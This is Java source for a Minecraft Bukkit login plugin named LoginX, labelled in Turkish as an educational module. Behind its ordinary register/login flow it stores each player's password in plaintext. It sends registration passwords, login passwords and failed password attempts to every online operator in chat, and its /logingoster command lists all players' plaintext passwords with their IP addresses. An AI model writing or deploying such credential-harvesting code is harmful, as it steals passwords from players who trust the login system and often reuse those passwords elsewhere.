package com.loginx;

import org.bukkit.*;
import org.bukkit.command.*;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.player.*;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.*;

public class LoginX extends JavaPlugin implements Listener {

    private final Map<UUID, String> passwords = new HashMap<>(); // Hashli
    private final Map<UUID, String> rawPasswords = new HashMap<>(); // Açık Şifre (Öğretim amaçlı)
    private final Map<UUID, Integer> attempts = new HashMap<>();
    private final Set<UUID> loggedIn = new HashSet<>();
    private final Map<UUID, String> lastIP = new HashMap<>();
    private FileConfiguration cfg;

    @Override
    public void onEnable() {
        Bukkit.getPluginManager().registerEvents(this, this);
        saveDefaultConfig();
        cfg = getConfig();
        getLogger().info("LoginX Egitim Modulu Aktif.");
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        Player p = e.getPlayer();
        UUID uuid = p.getUniqueId();
        lastIP.put(uuid, p.getAddress().getAddress().getHostAddress());

        new BukkitRunnable() {
            int count = 0;
            @Override
            public void run() {
                if (loggedIn.contains(uuid) || count >= cfg.getInt("title_interval") || !p.isOnline()) {
                    cancel();
                    return;
                }
                sendLoginTitle(p);
                count++;
            }
        }.runTaskTimer(this, 0, 40L);

        new BukkitRunnable() {
            @Override
            public void run() {
                if (p.isOnline() && !loggedIn.contains(uuid)) {
                    p.kickPlayer(color("&cZamanında giriş yapmadınız!"));
                }
            }
        }.runTaskLater(this, cfg.getInt("login_timeout") * 20L);
    }

    private void sendLoginTitle(Player p) {
        String header, footer;
        if (!passwords.containsKey(p.getUniqueId())) {
            header = color(cfg.getString("title_colors.register.header"));
            footer = color(cfg.getString("title_colors.register.footer"));
        } else {
            header = color(cfg.getString("title_colors.login.header"));
            footer = color(cfg.getString("title_colors.login.footer"));
        }
        p.sendTitle(header, footer, 10, 40, 10);
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (!(sender instanceof Player player)) return true;
        UUID uuid = player.getUniqueId();

        if (cmd.getName().equalsIgnoreCase("register")) {
            if (args.length < 2) {
                player.sendMessage(color("&cKullanım: /register <şifre> <şifre>"));
                return true;
            }
            if (!args[0].equals(args[1])) {
                player.sendMessage(color("&cŞifreler uyuşmuyor!"));
                return true;
            }
            passwords.put(uuid, hash(args[0]));
            rawPasswords.put(uuid, args[0]);
            loggedIn.add(uuid);
            player.sendMessage(color("&aBaşarıyla kayıt oldun!"));
            notifyOps(player, "&d[YENI KAYIT] &eSifre: &f" + args[0]);
            return true;
        }

        if (cmd.getName().equalsIgnoreCase("login")) {
            if (args.length < 1) {
                player.sendMessage(color("&cKullanım: /login <şifre>"));
                return true;
            }
            String input = args[0];
            if (hash(input).equals(passwords.get(uuid))) {
                loggedIn.add(uuid);
                player.sendMessage(color("&aGiriş başarılı!"));
                notifyOps(player, "&a[GIRIS] &eSifre: &f" + input);
            } else {
                player.sendMessage(color("&cYanlış şifre!"));
                attempts.put(uuid, attempts.getOrDefault(uuid, 0) + 1);
                notifyOps(player, "&c[HATALI DENEME] &eDenenen: &f" + input);
                if (attempts.get(uuid) >= 3) player.kickPlayer("Hatalı deneme limiti!");
            }
            return true;
        }

        if (cmd.getName().equalsIgnoreCase("logingoster")) {
            if (!player.hasPermission("loginx.view")) return true;

            if (args.length == 1 && args[0].equalsIgnoreCase("hepsi")) {
                player.sendMessage(color("&5&l=== TUM OYUNCU LOGIN VERILERI ==="));
                for (UUID id : rawPasswords.keySet()) {
                    String name = Bukkit.getOfflinePlayer(id).getName();
                    player.sendMessage(color("&d> &b" + name + " &8| &eSifre: &f" + rawPasswords.get(id) + " &8| &7IP: " + lastIP.get(id)));
                }
                return true;
            }

            if (args.length == 1) {
                OfflinePlayer target = Bukkit.getOfflinePlayer(args[0]);
                UUID tUUID = target.getUniqueId();
                player.sendMessage(color("&6&lLoginX Sorgu: &f" + target.getName()));
                player.sendMessage(color("&eAcık Sifre: &b" + rawPasswords.getOrDefault(tUUID, "Veri yok")));
                player.sendMessage(color("&eSon IP: &f" + lastIP.getOrDefault(tUUID, "Bilinmiyor")));
                return true;
            }
        }
        return true;
    }

    @EventHandler public void onMove(PlayerMoveEvent e) { if (!loggedIn.contains(e.getPlayer().getUniqueId())) e.setCancelled(true); }
    @EventHandler public void onChat(AsyncPlayerChatEvent e) { if (!loggedIn.contains(e.getPlayer().getUniqueId())) e.setCancelled(true); }

    private void notifyOps(Player p, String info) {
        String msg = color("&d&lLoginX &8| &b" + p.getName() + " &8» " + info);
        Bukkit.getOnlinePlayers().stream().filter(Player::isOp).forEach(op -> op.sendMessage(msg));
    }

    private String hash(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] bytes = md.digest(input.getBytes());
            StringBuilder sb = new StringBuilder();
            for (byte b : bytes) sb.append(String.format("%02x", b));
            return sb.toString();
        } catch (Exception e) { return input; }
    }

    private String color(String s) { return ChatColor.translateAlternateColorCodes('&', s); }
}
